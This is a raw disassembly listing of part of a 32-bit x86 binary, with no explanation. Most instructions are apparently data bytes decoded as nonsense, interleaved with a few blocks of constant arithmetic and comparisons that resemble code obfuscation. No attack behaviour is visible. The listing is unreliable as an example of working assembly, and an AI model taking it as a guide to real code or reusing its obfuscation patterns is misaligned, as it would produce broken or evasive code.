  40bd07:	and    DWORD PTR [edi],eax
  40bd09:	ret    0xbfd8
  40bd0c:	push   ss
  40bd0d:	out    dx,al
  40bd0e:	ret    
  40bd0f:	adc    ch,bl
  40bd11:	jbe    0x40bce6
  40bd13:	push   eax
  40bd14:	outs   dx,DWORD PTR ds:[esi]
  40bd15:	cli    
  40bd16:	sbb    eax,0x1f0d9326
  40bd1b:	lahf   
  40bd1c:	test   al,0xcf
  40bd1e:	fisttp DWORD PTR [ebx-0x4]
  40bd21:	push   ebp
  40bd22:	fs jae 0x40bd5f
  40bd25:	in     al,0xc4
  40bd27:	cmp    DWORD PTR [esi],eax
  40bd29:	outs   dx,DWORD PTR ds:[esi]
  40bd2a:	push   eax
  40bd2b:	hlt    
  40bd2c:	mov    ss,WORD PTR [edx]
  40bd2e:	test   eax,0xd6028dfa
  40bd33:	out    dx,al
  40bd34:	push   edi
  40bd35:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40bd37:	xor    eax,0x17499eec
  40bd3c:	pop    es
  40bd3d:	mov    ebx,0x70167fac
  40bd42:	test   eax,0xe3b08fef
  40bd47:	xor    al,0x51
  40bd49:	push   cs
  40bd4a:	inc    esi
  40bd4b:	jne    0x40bcf4
  40bd4d:	mov    ebp,0x52046872
  40bd52:	bound  ecx,QWORD PTR [edi]
  40bd54:	or     ebx,DWORD PTR [edi-0x37]
  40bd57:	pop    ds
  40bd58:	dec    esp
  40bd59:	mov    edi,0xbeffd9b4
  40bd5e:	(bad)  
  40bd5f:	aad    0xb8
  40bd61:	cli    
  40bd62:	cmp    ecx,DWORD PTR [edi-0x48ef3694]
  40bd68:	jecxz  0x40bde5
  40bd6a:	xchg   bl,ah
  40bd6c:	and    ebp,eax
  40bd6e:	push   0x15
  40bd70:	stc    
  40bd71:	add    eax,0xfc89dca8
  40bd76:	iret   
  40bd77:	pop    edi
  40bd78:	shl    BYTE PTR [ebx],1
  40bd7a:	lahf   
  40bd7b:	(bad)  
  40bd7c:	jle    0x40bd18
  40bd7e:	das    
  40bd7f:	jmp    0x8954757d
  40bd84:	sahf   
  40bd85:	mov    ?,WORD PTR [esi+0x2114e30e]
  40bd8b:	cmp    BYTE PTR [eax+0x29474c33],bl
  40bd91:	fnstsw WORD PTR [ebx+ebx*2-0x1bfa71f2]
  40bd98:	dec    ecx
  40bd99:	adc    bl,0xe6
  40bd9c:	js     0x40bdcf
  40bd9e:	std    
  40bd9f:	pop    eax
  40bda0:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bda2:	jnp    0x40bd83
  40bda4:	xor    eax,0x1d92e080
  40bda9:	cdq    
  40bdaa:	(bad)  
  40bdab:	fdiv   st,st(4)
  40bdad:	mov    dh,0xfa
  40bdaf:	mov    ecx,0x3caf7e94
  40bdb4:	sbb    al,0x95
  40bdb6:	les    ebx,FWORD PTR gs:[eax-0x42]
  40bdba:	pop    ecx
  40bdbb:	mov    ecx,DWORD PTR [esi]
  40bdbd:	fnstenv [edi+edx*2+0x6d7c71fe]
  40bdc4:	adc    eax,0xe91b16ae
  40bdc9:	jnp    0x40bd94
  40bdcb:	repnz mov esi,0xa64c4de4
  40bdd1:	sbb    eax,DWORD PTR [edi+0x16c76a20]
  40bdd7:	call   0xa2:0x1abf4905
  40bdde:	mov    gs,WORD PTR [ebp+0x61d30ab7]
  40bde4:	inc    ebx
  40bde5:	hlt    
  40bde6:	mov    esp,0x9c1cd162
  40bdeb:	jg     0x40be25
  40bded:	xchg   ebx,eax
  40bdee:	sar    DWORD PTR [esp+edx*8+0x795ce5fe],1
  40bdf5:	cmp    cl,BYTE PTR [bx]
  40bdf8:	sub    DWORD PTR [edx-0x5d36aef4],edx
  40bdfe:	add    dl,BYTE PTR [ecx+edi*8-0x16]
  40be02:	add    eax,0x981ec534
  40be07:	cmp    DWORD PTR [eax-0x77],esp
  40be0a:	call   0xc86f:0x1bdd2242
  40be11:	sbb    DWORD PTR [eax],edi
  40be13:	and    BYTE PTR [esi-0x6a],ch
  40be16:	cmp    ebp,DWORD PTR [esi+0x625ba77]
  40be1c:	and    BYTE PTR [edi-0x13],0x56
  40be20:	cmp    dh,0x65
  40be23:	dec    ebx
  40be24:	ds mov sp,0x568
  40be29:	push   es
  40be2a:	xor    al,BYTE PTR [ecx]
  40be2c:	mov    WORD PTR [edi+edx*2-0x120a4c8e],?
  40be33:	inc    eax
  40be34:	sub    edi,DWORD PTR [eax]
  40be36:	dec    esi
  40be37:	mov    ebp,0xe7a8902e
  40be3c:	in     al,dx
  40be3d:	jae    0x40beb3
  40be3f:	jecxz  0x40be55
  40be41:	mov    edi,0x209bd966
  40be46:	jmp    0x40bea5
  40be48:	neg    cl
  40be4a:	dec    ebx
  40be4b:	les    ebx,FWORD PTR [edx+ecx*1]
  40be4e:	scas   al,BYTE PTR es:[edi]
  40be4f:	bound  ebp,QWORD PTR [eax]
  40be51:	test   DWORD PTR [edx+edi*1+0x5388b2bc],edx
  40be58:	jecxz  0x40be07
  40be5a:	adc    ebp,DWORD PTR [esi-0x1f2f6c40]
  40be60:	sub    BYTE PTR [ebx+0x34f6a1cb],0xe0
  40be67:	mov    bl,0xe9
  40be69:	add    eax,0xbd150c88
  40be6e:	pusha  
  40be6f:	cmp    eax,0xf018d886
  40be74:	adc    BYTE PTR [ebp+0x41],ch
  40be77:	sbb    eax,0xa36a8c52
  40be7c:	add    BYTE PTR [ebx-0x3df4bfb4],al
  40be82:	clc    
  40be83:	mov    WORD PTR [edx],ds
  40be85:	je     0x40befa
  40be87:	adc    ecx,DWORD PTR [ecx+0x45c7f44d]
  40be8d:	loopne 0x40bedf
  40be8f:	dec    edx
  40be90:	add    BYTE PTR [eax],al
  40be92:	mov    DWORD PTR [ebp-0x1c],0x2079
  40be99:	mov    DWORD PTR [ebp-0x28],0x792e
  40bea0:	mov    DWORD PTR [ebp-0x24],0x10e8
  40bea7:	mov    DWORD PTR [ebp-0x30],0x22b3
  40beae:	mov    DWORD PTR [ebp-0x2c],0x2293
  40beb5:	mov    eax,DWORD PTR [ebp-0x30]
  40beb8:	mov    ecx,DWORD PTR [ebp-0x2c]
  40bebb:	mov    edx,DWORD PTR [ebp-0x28]
  40bebe:	mov    esi,DWORD PTR [ebp-0x24]
  40bec1:	add    eax,edx
  40bec3:	mov    edx,DWORD PTR [ebp-0x20]
  40bec6:	adc    ecx,esi
  40bec8:	mov    esi,DWORD PTR [ebp-0x1c]
  40becb:	add    eax,0x3e60
  40bed0:	adc    ecx,0xd49e
  40bed6:	xor    eax,0x14ce
  40bedb:	xor    ecx,0x354f
  40bee1:	add    eax,edx
  40bee3:	mov    edx,DWORD PTR [ebp-0x10]
  40bee6:	adc    ecx,esi
  40bee8:	mov    esi,DWORD PTR [ebp-0xc]
  40beeb:	cmp    edx,eax
  40beed:	jne    0x40befb
  40bef3:	cmp    esi,ecx
  40bef5:	je     0x40cc06
  40befb:	mov    DWORD PTR [ebp-0x28],0x4db
  40bf02:	mov    DWORD PTR [ebp-0x24],0x233b
  40bf09:	mov    DWORD PTR [ebp-0x30],0x2c94
  40bf10:	push   0x6b33
  40bf15:	mov    DWORD PTR [ebp-0x2c],0x647f
  40bf1c:	mov    eax,DWORD PTR [ebp-0x30]
  40bf1f:	mov    ecx,DWORD PTR [ebp-0x2c]
  40bf22:	push   0x7c8f
  40bf27:	push   ecx
  40bf28:	push   eax
  40bf29:	call   0x416c20
  40bf2e:	mov    ecx,DWORD PTR [ebp-0x28]
  40bf31:	mov    esi,DWORD PTR [ebp-0x24]
  40bf34:	push   0x4e1a18a
  40bf39:	push   0x283cdcc
  40bf3e:	and    edx,esi
  40bf40:	and    eax,ecx
  40bf42:	push   edx
  40bf43:	jmp    0x40c339
  40bf48:	fst    DWORD PTR [ebp-0x17]
  40bf4b:	or     eax,0x4c9c1c65
  40bf50:	push   ds
  40bf51:	jp     0x40bede
  40bf53:	jo     0x40bfd2
  40bf55:	pop    ds
  40bf56:	xchg   DWORD PTR [esi+esi*4+0x5],edi
  40bf5a:	sbb    BYTE PTR [eax],bl
  40bf5c:	outs   dx,BYTE PTR ds:[esi]
  40bf5d:	adc    bl,BYTE PTR [eax]
  40bf5f:	sbb    bh,ch
  40bf61:	inc    ebx
  40bf62:	rcr    esi,cl
  40bf64:	push   esi
  40bf65:	in     eax,0xf
  40bf67:	enter  0x93ff,0x65
  40bf6b:	xchg   ebx,eax
  40bf6c:	lea    esi,[ecx-0xedddda7]
  40bf72:	stos   BYTE PTR es:[edi],al
  40bf73:	daa    
  40bf74:	ja     0x40bf94
  40bf76:	scas   al,BYTE PTR es:[edi]
  40bf77:	out    0x6e,al
  40bf79:	cmp    BYTE PTR [esi*2-0x1abdad59],ch
  40bf80:	call   0x8f93:0xc55f7858
  40bf87:	mov    ch,0x8d
  40bf89:	xor    al,BYTE PTR [edi+esi*2]
  40bf8c:	scas   eax,DWORD PTR es:[edi]
  40bf8d:	mov    eax,0x58f9b20d
  40bf92:	push   esi
  40bf93:	inc    edx
  40bf94:	xchg   esp,eax
  40bf95:	sbb    ebp,DWORD PTR [ecx+eax*4]
  40bf98:	(bad)  
  40bf99:	stos   BYTE PTR es:[edi],al
  40bf9a:	fiadd  WORD PTR [esi]
  40bf9c:	mov    ds:0xc0e3e23d,al
  40bfa1:	imul   ebx,ebp,0x589bd76b
  40bfa7:	cli    
  40bfa8:	and    bl,0xf0
  40bfab:	lock mov dl,0x11
  40bfae:	shl    BYTE PTR [edi],1
  40bfb0:	mov    ah,0x8d
  40bfb2:	or     ebx,DWORD PTR [ecx+0x25b68018]
  40bfb8:	cs cdq 
  40bfba:	stos   DWORD PTR es:[edi],eax
  40bfbb:	(bad)  
  40bfbc:	mov    esi,0x267d72b
  40bfc1:	and    cl,BYTE PTR [edx+edx*2]
  40bfc4:	std    
  40bfc5:	sub    DWORD PTR [edx],0xffffffd7
  40bfc8:	aaa    
  40bfc9:	dec    ebp
  40bfca:	sahf   
  40bfcb:	xor    eax,0x16aa784d
  40bfd0:	scas   al,BYTE PTR es:[edi]
  40bfd1:	adc    ch,0x5e
  40bfd4:	(bad)  
  40bfd5:	jmp    0x40bff5
  40bfd7:	fdivr  DWORD PTR [ebx+edx*4+0x7850f88e]
  40bfde:	sub    ebx,0xffffff87
  40bfe1:	jbe    0x40bfdf
  40bfe3:	jo     0x40c002
  40bfe5:	jp     0x40bfaf
  40bfe7:	ins    DWORD PTR es:[edi],dx
  40bfe8:	adc    ebx,DWORD PTR [esp+ecx*8+0x70e5c571]
  40bfef:	cmc    
  40bff0:	test   al,0x2b
  40bff2:	mov    ebp,ebx
  40bff4:	cli    
  40bff5:	xlat   BYTE PTR ds:[ebx]
  40bff6:	mov    bl,0xa0
  40bff8:	pop    esi
  40bff9:	pop    ss
  40bffa:	je     0x40bfe4
  40bffc:	push   0x17
  40bffe:	loopne 0x40c065
  40c000:	clc    
  40c001:	jecxz  0x40bf94
  40c003:	jmp    0x40c07e
  40c005:	fs scas al,BYTE PTR es:[edi]
  40c007:	sub    ah,dh
  40c009:	icebp  
  40c00a:	mov    ah,0x83
  40c00c:	mov    al,ds:0x420fe785
  40c011:	cld    
  40c012:	mov    bh,BYTE PTR [edi+eiz*4-0x62]
  40c016:	adc    DWORD PTR [ecx-0x72dba507],edx
  40c01c:	outs   dx,DWORD PTR ds:[esi]
  40c01d:	rol    DWORD PTR [esi+eax*8],0xe
  40c021:	and    eax,0xf40b8dbc
  40c026:	outs   dx,BYTE PTR ds:[esi]
  40c027:	jmp    0x40bff5
  40c029:	cmc    
  40c02a:	mov    ecx,0x8eda747c
  40c02f:	xlat   BYTE PTR ds:[ebx]
  40c030:	add    eax,0x5631e9b6
  40c035:	push   edx
  40c036:	jbe    0x40c036
  40c038:	pop    eax
  40c039:	ret    0xa027
  40c03c:	mov    al,bl
  40c03e:	sti    
  40c03f:	fs out dx,eax
  40c041:	es shl eax,cl
  40c044:	jne    0x40c041
  40c046:	mov    ds:0xa295fdc3,al
  40c04b:	dec    edi
  40c04c:	es test al,0x40
  40c04f:	pop    ecx
  40c050:	stos   BYTE PTR es:[edi],al
  40c051:	mov    dl,0x41
  40c053:	mov    edi,0x4e86a1ca
  40c058:	arpl   WORD PTR [eax+0x73],bp
  40c05b:	dec    esi
  40c05c:	push   0x814ae231
  40c061:	cmp    al,0x99
  40c063:	jl     0x40c0d0
  40c065:	not    BYTE PTR [ebx-0x7904db3f]
  40c06b:	mov    BYTE PTR [ecx+0x72ebb848],0xcb
  40c072:	or     ch,BYTE PTR [esi+ecx*2-0x59]
  40c076:	add    ebx,esi
  40c078:	mov    dl,0x56
  40c07a:	ret    0xab3c
  40c07d:	dec    edi
  40c07e:	fnsave [ebx]
  40c080:	mov    edi,0x4cad59dd
  40c085:	mov    eax,DWORD PTR [esi+ebx*1+0x7e]
  40c089:	xchg   ecx,eax
  40c08a:	fs push eax
  40c08c:	icebp  
  40c08d:	sub    BYTE PTR [edi],dh
  40c08f:	fstp   TBYTE PTR [edi-0x130269f]
  40c095:	cdq    
  40c096:	test   DWORD PTR cs:[ebp+0x60],0xdd3f0b67
  40c09e:	xchg   edx,eax
  40c09f:	pop    esi
  40c0a0:	push   0xd
  40c0a2:	inc    edx
  40c0a3:	(bad)  
  40c0a4:	and    al,0x95
  40c0a6:	fiadd  DWORD PTR [eax+0x6ac96a04]
  40c0ac:	xchg   esp,ebp
  40c0ae:	lahf   
  40c0af:	enter  0x8b5,0xb8
  40c0b3:	xchg   edi,eax
  40c0b4:	cmp    al,BYTE PTR [edx]
  40c0b6:	retf   0x75d0
  40c0b9:	test   al,0x3c
  40c0bb:	cli    
  40c0bc:	adc    al,0xa2
  40c0be:	retf   
  40c0bf:	popf   
  40c0c0:	iret   
  40c0c1:	in     eax,dx
  40c0c2:	loope  0x40c084
  40c0c4:	mov    BYTE PTR [esi],ah
  40c0c6:	loop   0x40c12e
  40c0c8:	mov    ds:0x16e33d5,eax
  40c0cd:	add    BYTE PTR [ebp-0x12],bl
  40c0d0:	jno    0x40c0cd
  40c0d2:	call   0x99f1:0x32728dc
  40c0d9:	jle    0x40c145
  40c0db:	into   
  40c0dc:	sbb    al,0xd0
  40c0de:	dec    esp
  40c0df:	(bad)  
  40c0e0:	dec    ebx
  40c0e1:	add    DWORD PTR [ecx+edx*1-0x2a1ad4b4],ebx
  40c0e8:	das    
  40c0e9:	jge    0x40c082
  40c0eb:	fistp  QWORD PTR [edi-0x2e75d9c9]
  40c0f1:	or     dh,BYTE PTR [edx]
  40c0f3:	rcl    ebp,1
  40c0f5:	jmp    0x40c14d
  40c0f7:	sbb    BYTE PTR [ebx-0x77e7415b],dh
  40c0fd:	adc    ah,BYTE PTR [ebx-0x20]
  40c100:	or     eax,0x49a01bd7
  40c105:	cli    
  40c106:	cli    
  40c107:	clc    
  40c108:	dec    ebp
  40c109:	mov    esi,0x9878aa69
  40c10e:	imul   ebp,edi,0x39
  40c111:	pop    ds
  40c112:	mov    edx,eax
  40c114:	pop    ebx
  40c115:	add    bl,dh
  40c117:	mov    ch,0x67
  40c119:	or     esp,DWORD PTR [edx+0x1]
  40c11c:	outs   dx,DWORD PTR ds:[esi]
  40c11d:	xchg   esp,eax
  40c11e:	jp     0x40c188
  40c120:	adc    al,BYTE PTR [edi+0x2b]
  40c123:	dec    ebp
  40c124:	mov    ah,BYTE PTR [ebx+0x41df6634]
  40c12a:	add    BYTE PTR [ecx+0xc15bf53],ah
  40c130:	adc    DWORD PTR [eax-0x4d756ca0],0x30ddc4dd
  40c13a:	ins    BYTE PTR es:[edi],dx
  40c13b:	retf   
  40c13c:	jbe    0x40c147
  40c13e:	sub    bh,BYTE PTR [edx-0x1f]
  40c141:	shl    DWORD PTR [esi+0x75],cl
  40c144:	or     al,0x41
  40c146:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c147:	xor    ebx,DWORD PTR [eax-0x39]
  40c14a:	cmp    eax,0x18e702e2
  40c14f:	push   ecx
  40c150:	out    0xd5,eax
  40c152:	inc    edx
  40c153:	out    0xc4,al
  40c155:	jnp    0x40c0ef
  40c157:	(bad)  
  40c158:	in     al,0xba
  40c15a:	pop    es
  40c15b:	and    DWORD PTR [edi-0x16],ebp
  40c15e:	mov    al,0x4e
  40c160:	mov    edi,0x95ffc7f4
  40c165:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c166:	sar    BYTE PTR [esi-0x6a3e51ad],0xa4
  40c16d:	cmp    ah,BYTE PTR [edi]
  40c16f:	and    eax,0x66650023
  40c174:	mov    esp,0x209e11a9
  40c179:	inc    ebp
  40c17a:	dec    ecx
  40c17b:	xlat   BYTE PTR ds:[ebx]
  40c17c:	dec    esp
  40c17d:	jle    0x40c16a
  40c17f:	cs xor eax,0x1483d50f
  40c185:	cmp    ch,BYTE PTR [edi]
  40c187:	sar    al,0xfe
  40c18a:	test   DWORD PTR [edi],ecx
  40c18c:	xor    al,0x48
  40c18e:	jg     0x40c202
  40c190:	test   DWORD PTR [ebp-0x6156c0e3],0x6d70afac
  40c19a:	sub    DWORD PTR [ecx+0xe],ebp
  40c19d:	(bad)  
  40c19f:	push   0xffffffc4
  40c1a1:	dec    ebx
  40c1a2:	xor    eax,0x544e2150
  40c1a7:	cwde   
  40c1a8:	mov    dh,0x61
  40c1aa:	nop
  40c1ab:	popa   
  40c1ac:	cmp    BYTE PTR [edi+ebx*8],0x17
  40c1b0:	(bad)  
  40c1b1:	mov    edx,0xae1032de
  40c1b6:	inc    ebx
  40c1b7:	outs   dx,DWORD PTR ds:[esi]
  40c1b8:	push   ebx
  40c1b9:	ds dec edx
  40c1bb:	inc    DWORD PTR [esi+0x62]
  40c1be:	int3   
  40c1bf:	call   ebp
  40c1c1:	adc    ebp,ebx
  40c1c3:	and    BYTE PTR [edi],ah
  40c1c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1c6:	mov    al,0xd0
  40c1c8:	cmp    ch,cl
  40c1ca:	lahf   
  40c1cb:	rcr    BYTE PTR [ebx],1
  40c1cd:	cs aam 0x83
  40c1d0:	test   al,0xcc
  40c1d2:	xor    BYTE PTR [eax],ah
  40c1d4:	test   BYTE PTR [edx],dh
  40c1d6:	gs call 0x3824:0x36fe972a
  40c1de:	push   ecx
  40c1df:	aas    
  40c1e0:	xchg   DWORD PTR [ecx+edi*1-0x2c3c05c0],ecx
  40c1e7:	and    ah,BYTE PTR [ebp+0x68]
  40c1ea:	int    0x9d
  40c1ec:	jecxz  0x40c181
  40c1ee:	cmp    dh,al
  40c1f0:	es cmp al,0xfe
  40c1f3:	aam    0xb
  40c1f5:	mov    esp,0x64c267de
  40c1fa:	push   ebp
  40c1fb:	xchg   esi,eax
  40c1fc:	jge    0x40c197
  40c1fe:	inc    esi
  40c1ff:	mov    ds:0xc54e81b4,al
  40c204:	mov    dl,0xdb
  40c206:	mov    bh,cl
  40c208:	pusha  
  40c209:	jmp    0x40c1a0
  40c20b:	shl    BYTE PTR [ecx-0x2768639e],0xf8
  40c212:	mov    ebx,0x3ca219c1
  40c217:	jb     0x40c1ca
  40c219:	fistp  QWORD PTR [edi+0x6b]
  40c21c:	imul   esp,DWORD PTR [ecx+0x26f49ec],0x27
  40c223:	dec    ecx
  40c224:	popa   
  40c225:	mov    cl,0xc6
  40c227:	loop   0x40c216
  40c229:	xor    bl,dl
  40c22b:	xchg   DWORD PTR [eax],edi
  40c22d:	outs   dx,BYTE PTR cs:[esi]
  40c22f:	rcl    bh,1
  40c231:	cwde   
  40c232:	std    
  40c233:	fcomp  QWORD PTR [ecx-0x413d1cb5]
  40c239:	dec    ebp
  40c23a:	adc    edi,DWORD PTR [edi-0x3f]
  40c23d:	es retf 0x47d4
  40c241:	pusha  
  40c242:	sub    cl,BYTE PTR [esp+edx*8+0x51]
  40c246:	aad    0xda
  40c248:	out    0x5c,eax
  40c24a:	lds    ecx,FWORD PTR [edi]
  40c24c:	jmp    0xa7f6:0x35b25e8
  40c253:	xchg   eax,ecx
  40c255:	mov    edx,0x4e8c3774
  40c25a:	mov    cl,0x3e
  40c25c:	pop    es
  40c25d:	dec    edi
  40c25e:	retf   
  40c25f:	sahf   
  40c260:	fs jge 0x40c248
  40c263:	inc    eax
  40c264:	and    cl,cl
  40c266:	sub    al,0xdd
  40c268:	pop    esi
  40c269:	mov    ds,edi
  40c26b:	push   0x29
  40c26d:	cwde   
  40c26e:	daa    
  40c26f:	shl    DWORD PTR [edi+0x18],0xfd
  40c273:	clc    
  40c274:	pusha  
  40c275:	imul   ebx,DWORD PTR [esi+edx*1],0xcb8a1025
  40c27c:	inc    esp
  40c27d:	sub    eax,0x1d5d36ba
  40c282:	arpl   WORD PTR [edx],sp
  40c284:	adc    al,0x46
  40c286:	dec    esi
  40c287:	push   cs
  40c288:	jno    0x40c266
  40c28a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c28b:	test   BYTE PTR [edi],ah
  40c28d:	hlt    
  40c28e:	xchg   ebx,eax
  40c28f:	jmp    0x40c2cd
  40c291:	pop    eax
  40c292:	jecxz  0x40c217
  40c294:	jle    0x40c268
  40c296:	cli    
  40c297:	inc    eax
  40c298:	repz dec edx
  40c29a:	jp     0x40c28c
  40c29c:	bound  edi,QWORD PTR [edi+0x5f166626]
  40c2a2:	outs   dx,DWORD PTR ds:[esi]
  40c2a3:	and    eax,0xdffefa1d
  40c2a8:	xchg   DWORD PTR [edx],ebp
  40c2aa:	cdq    
  40c2ab:	jno    0x40c289
  40c2ad:	push   ss
  40c2ae:	retf   0xfc98
  40c2b1:	push   edx
  40c2b2:	retf   0x48bb
  40c2b5:	(bad)  
  40c2b6:	pop    ebp
  40c2b7:	test   eax,0xac8db969
  40c2bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2bd:	test   DWORD PTR ss:[edi-0x2a],ecx
  40c2c1:	aas    
  40c2c2:	hlt    
  40c2c3:	cwde   
  40c2c4:	bound  eax,QWORD PTR [eax-0x72276de]
  40c2ca:	dec    ecx
  40c2cb:	rol    DWORD PTR [eax+0x2efeb9ce],cl
  40c2d1:	int3   
  40c2d2:	mov    ah,0xcb
  40c2d4:	int    0x4
  40c2d6:	sub    DWORD PTR [esp+eax*8+0x18],edx
  40c2da:	ins    BYTE PTR es:[edi],dx
  40c2db:	add    dl,BYTE PTR [esi]
  40c2dd:	cmp    BYTE PTR [ebx-0x7a],0xec
  40c2e1:	scas   eax,DWORD PTR es:[edi]
  40c2e2:	jnp    0x40c2d5
  40c2e4:	push   eax
  40c2e5:	dec    ebp
  40c2e6:	add    al,0x26
  40c2e8:	and    ecx,esp
  40c2ea:	mov    esp,0x21e327f3
  40c2ef:	or     BYTE PTR [esi+esi*4-0x2b1a2bb3],dl
  40c2f6:	iret   
  40c2f7:	jo     0x40c290
  40c2f9:	jnp    0x40c337
  40c2fb:	mov    ebp,0xb2b3c7a9
  40c300:	sbb    eax,0x7bc87a2e
  40c305:	mov    edx,0xc16b6e3c
  40c30a:	test   dh,cl
  40c30c:	les    ebp,FWORD PTR [eax+0x59]
  40c30f:	test   al,0x46
  40c311:	popf   
  40c312:	mov    al,0x1d
  40c314:	pop    ebp
  40c315:	and    dh,BYTE PTR [ecx+0x2]
  40c318:	jnp    0x40c300
  40c31a:	(bad)  
  40c31b:	mov    bl,0xd0
  40c31d:	pushf  
  40c31e:	out    0x76,al
  40c320:	jmp    0xf67d:0x1780a84b
  40c327:	sbb    eax,DWORD PTR [eax]
  40c329:	xor    DWORD PTR [esi-0x5],edx
  40c32c:	in     al,dx
  40c32d:	(bad)  
  40c32e:	sbb    BYTE PTR [ebp-0x37],dh
  40c331:	jb     0x40c351
  40c333:	retf   0x15e2
  40c336:	pop    esp
  40c337:	jmp    0xa8:0xe1e8501d
  40c33e:	add    BYTE PTR ds:0x687b,dh
  40c344:	xor    edx,0x18d4
  40c34a:	mov    DWORD PTR [ebp-0x30],eax
  40c34d:	mov    DWORD PTR [ebp-0x2c],edx
  40c350:	mov    eax,ds:0x42277c
  40c355:	cmp    eax,0x7cd80819
  40c35a:	jne    0x40cc06
  40c360:	mov    eax,DWORD PTR [ebp-0x18]
  40c363:	mov    ecx,DWORD PTR [ebp-0x14]
  40c366:	mov    edx,DWORD PTR [ebp-0x18]
  40c369:	mov    esi,DWORD PTR [ebp-0x14]
  40c36c:	shrd   eax,ecx,0x2
  40c370:	shl    edx,0x1e
  40c373:	mov    edx,DWORD PTR ds:0x422568
  40c379:	mov    edx,DWORD PTR [edx+0x1a8]
  40c37f:	shr    ecx,0x2
  40c382:	xor    esi,esi
  40c384:	mov    ecx,0x329e695d
  40c389:	xor    eax,ecx
  40c38b:	or     eax,esi
  40c38d:	mov    DWORD PTR [edx],eax
  40c38f:	mov    eax,DWORD PTR [ebp-0x18]
  40c392:	mov    edx,DWORD PTR [ebp-0x14]
  40c395:	shrd   eax,edx,0x2
  40c399:	shr    edx,0x2
  40c39c:	mov    edx,DWORD PTR [ebp-0x18]
  40c39f:	mov    esi,DWORD PTR [ebp-0x14]
  40c3a2:	xor    eax,ecx
  40c3a4:	xor    esi,esi
  40c3a6:	or     eax,esi
  40c3a8:	mov    ds:0x42277c,eax
  40c3ad:	mov    BYTE PTR [ebp-0x2],0x4f
  40c3b1:	mov    BYTE PTR [ebp-0x1],0xf9
  40c3b5:	movzx  eax,BYTE PTR [ebp-0x1]
  40c3b9:	shl    edx,0x1e
  40c3bc:	mov    dl,BYTE PTR [ebp-0x2]
  40c3bf:	jmp    0x40c7b5
  40c3c4:	(bad)  
  40c3c5:	xor    al,0x5b
  40c3c7:	mov    dl,0x5b
  40c3c9:	call   0x6af2:0x3fac243e
  40c3d0:	test   DWORD PTR [edi-0x2f2435b],eax
  40c3d6:	sbb    BYTE PTR [eax],bl
  40c3d8:	outs   dx,BYTE PTR ds:[esi]
  40c3d9:	adc    bl,BYTE PTR [eax]
  40c3db:	sbb    BYTE PTR [ecx],dl
  40c3dd:	mov    ds:0xd76e13a,al
  40c3e2:	mov    DWORD PTR [ebx+0x448e32a2],eax
  40c3e8:	shl    ebp,0x45
  40c3eb:	(bad)  
  40c3ec:	fdivr  DWORD PTR [eax+0x274d26dd]
  40c3f2:	mov    ah,0x20
  40c3f4:	mov    ecx,0x8fc9c69e
  40c3f9:	or     al,0xad
  40c3fb:	mov    dh,0xfa
  40c3fd:	fs jb  0x40c426
  40c400:	jg     0x40c426
  40c402:	xchg   ch,bl
  40c404:	add    edx,DWORD PTR [edi+0x23]
  40c407:	xor    BYTE PTR [ebx-0x46],bh
  40c40a:	pop    edx
  40c40b:	mov    al,0xdb
  40c40d:	int    0x12
  40c40f:	popa   
  40c410:	inc    ebp
  40c411:	popf   
  40c412:	or     dh,dl
  40c414:	(bad)  
  40c415:	ficom  WORD PTR [edi+0x6375d913]
  40c41b:	inc    esp
  40c41c:	dec    eax
  40c41d:	retf   0x8fe9
  40c420:	cdq    
  40c421:	cli    
  40c422:	xlat   BYTE PTR ds:[ebx]
  40c423:	div    BYTE PTR [eax-0xe]
  40c426:	mov    eax,ds:0xb493b66c
  40c42b:	pop    esi
  40c42c:	loope  0x40c424
  40c42e:	in     eax,dx
  40c42f:	sahf   
  40c430:	loopne 0x40c3fa
  40c432:	adc    esi,DWORD PTR [ecx+0x4beffd5f]
  40c438:	pop    edx
  40c439:	popf   
  40c43a:	pop    edx
  40c43b:	pop    ds
  40c43c:	or     BYTE PTR [ebx+0x27],cl
  40c43f:	or     DWORD PTR [esi-0x36],ecx
  40c442:	cmp    eax,0x6b6bbd3f
  40c447:	pop    es
  40c448:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c449:	pushf  
  40c44a:	out    dx,eax
  40c44b:	jno    0x42c99f4e
  40c451:	pop    esp
  40c452:	inc    ebx
  40c453:	cmp    esi,DWORD PTR [ebx]
  40c455:	adc    al,0x3f
  40c457:	add    eax,0x445cf134
  40c45c:	inc    esi
  40c45d:	sbb    al,BYTE PTR [esi+0x44]
  40c460:	jo     0x40c450
  40c462:	mov    ds:0xbb547fad,al
  40c467:	xchg   ecx,eax
  40c468:	dec    esi
  40c469:	mov    al,ds:0xdc6b06d4
  40c46e:	cmp    al,0x98
  40c470:	ret    
  40c471:	push   eax
  40c472:	int3   
  40c473:	dec    ebp
  40c474:	sbb    BYTE PTR [ecx],dh
  40c476:	mov    al,ds:0x9ec59e4e
  40c47b:	popa   
  40c47c:	imul   esp,DWORD PTR [edi+0x34a15b60],0x5327e6e9
  40c486:	xor    al,0x32
  40c488:	jle    0x40c480
  40c48a:	jl     0x40c463
  40c48c:	push   0xfffffff8
  40c48e:	inc    edx
  40c48f:	sar    DWORD PTR [edi-0x2596d9e6],cl
  40c495:	jmp    0x40c46e
  40c497:	dec    eax
  40c498:	cmp    bl,0xb1
  40c49b:	jmp    0x40c436
  40c49d:	gs adc al,0xa3
  40c4a0:	and    bl,BYTE PTR [esp+edi*1-0x5f]
  40c4a4:	mov    ds:0x76ca401a,al
  40c4a9:	jo     0x40c4d1
  40c4ab:	sar    BYTE PTR [eax+0x62],0x99
  40c4af:	push   esp
  40c4b0:	xchg   edi,eax
  40c4b1:	loope  0x40c4f5
  40c4b3:	or     BYTE PTR [eax+0x6e5f1ff3],ch
  40c4b9:	xor    eax,0x761c2796
  40c4be:	or     DWORD PTR [edi-0xe4973ef],edi
  40c4c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4c5:	(bad)  
  40c4c6:	jl     0x40c45e
  40c4c8:	in     al,dx
  40c4c9:	jns    0x40c472
  40c4cb:	push   ebx
  40c4cc:	xor    DWORD PTR [edx-0x75],0xcf8a021f
  40c4d3:	or     ebp,DWORD PTR [esi+0x4c3ef2d5]
